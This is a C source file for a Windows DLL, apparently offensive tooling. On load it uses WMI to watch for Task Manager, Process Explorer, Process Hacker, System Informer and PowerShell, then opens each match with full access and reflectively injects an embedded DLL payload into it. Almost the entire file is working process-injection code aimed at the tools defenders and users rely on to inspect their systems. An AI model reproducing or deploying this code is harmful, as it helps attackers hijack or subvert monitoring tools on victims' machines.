/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

    gcc -o catchNewProc_v2.dll -shared -fPIC catchNewProc_v2.c -s -lwbemuuid -lole32 -loleaut32 -luuid -masm=intel -O3

*/

#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "hReflectiveLoader\allocateExecute.h"

BYTE dllHexData[] = { };
SIZE_T dllSize = sizeof(dllHexData);

const char* TARGET_PROCESSES[] = {
    "processhacker.exe", "procexp64.exe", 
    "taskmgr.exe", "powershell.exe", "systeminformer.exe"
};

VOID ShowMessage(const char* title, const char* format, ...) {
    char msg[256];
    va_list args;
    va_start(args, format);
    vsnprintf(msg, sizeof(msg), format, args);
    va_end(args);
    MessageBoxA(NULL, msg, title, MB_OK | MB_ICONINFORMATION);
}

VOID runAllocateExecute(DWORD pid) {
    HANDLE tProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!tProcess) {
        ShowMessage("FAILED", "Cannot open process %lu", pid);
        return;
    }

    if (!allocateExecute(tProcess, dllHexData, dllSize))
        ShowMessage("FAILED", "Injection failed for PID %lu", pid);

    CloseHandle(tProcess);
}

BOOL IsTargetProcessRunning() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        ShowMessage("Error", "Failed to create snapshot of processes.");
        return FALSE;
    }

    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        ShowMessage("Error", "Failed to get first process.");
        return FALSE;
    }

    do {
        for (int i = 0; i < sizeof(TARGET_PROCESSES) / sizeof(TARGET_PROCESSES[0]); ++i) {
            if (_stricmp(pe32.szExeFile, TARGET_PROCESSES[i]) == 0) {
                DWORD pid = pe32.th32ProcessID;
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runAllocateExecute, (LPVOID)(uintptr_t)pid, 0, NULL);
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return TRUE;
}

DWORD MonitorProcesses() {
    HRESULT hr;
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    IEnumWbemClassObject *pEnumerator = NULL;

    CoInitializeEx(0, COINIT_MULTITHREADED);
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

    if (FAILED(CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (void**)&pLoc)) ||
        FAILED(pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, NULL, WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc)) ||
        FAILED(CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
        ShowMessage("Error", "WMI setup failed.");
        CoUninitialize();
        return 1;
    }

    hr = pSvc->lpVtbl->ExecNotificationQuery(pSvc, L"WQL", L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
    if (FAILED(hr)) {
        ShowMessage("Error", "WMI query failed.");
        CoUninitialize();
        return 1;
    }

    // ShowMessage("Monitoring", "WMI monitoring started.");

    // Check if any target processes are already running
    IsTargetProcessRunning();

    IWbemClassObject* pEvent = NULL;
    ULONG returnVal = 0;
    while (SUCCEEDED(pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pEvent, &returnVal)) && returnVal) {
        VARIANT varTargetInstance;
        hr = pEvent->lpVtbl->Get(pEvent, L"TargetInstance", 0, &varTargetInstance, NULL, NULL);
        if (FAILED(hr)) continue;

        IWbemClassObject* pInstance = (IWbemClassObject*)varTargetInstance.pdispVal;
        VARIANT varName, varPID;
        hr = pInstance->lpVtbl->Get(pInstance, L"Name", 0, &varName, NULL, NULL);
        hr = pInstance->lpVtbl->Get(pInstance, L"ProcessId", 0, &varPID, NULL, NULL);

        char name[256];
        WideCharToMultiByte(CP_ACP, 0, varName.bstrVal, -1, name, sizeof(name), NULL, NULL);

        for (int i = 0; i < sizeof(TARGET_PROCESSES) / sizeof(TARGET_PROCESSES[0]); ++i) {
            if (_stricmp(name, TARGET_PROCESSES[i]) == 0) {
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runAllocateExecute, (LPVOID)(uintptr_t)varPID.uintVal, 0, NULL);
                // ShowMessage("Alert", "Detected: %s (PID: %lu)", name, varPID.uintVal);
            }
        }

        VariantClear(&varName);
        VariantClear(&varPID);
        VariantClear(&varTargetInstance);
        pEvent->lpVtbl->Release(pEvent);
    }

    pEnumerator->lpVtbl->Release(pEnumerator);
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcesses, NULL, 0, NULL);
    }
    return TRUE;
}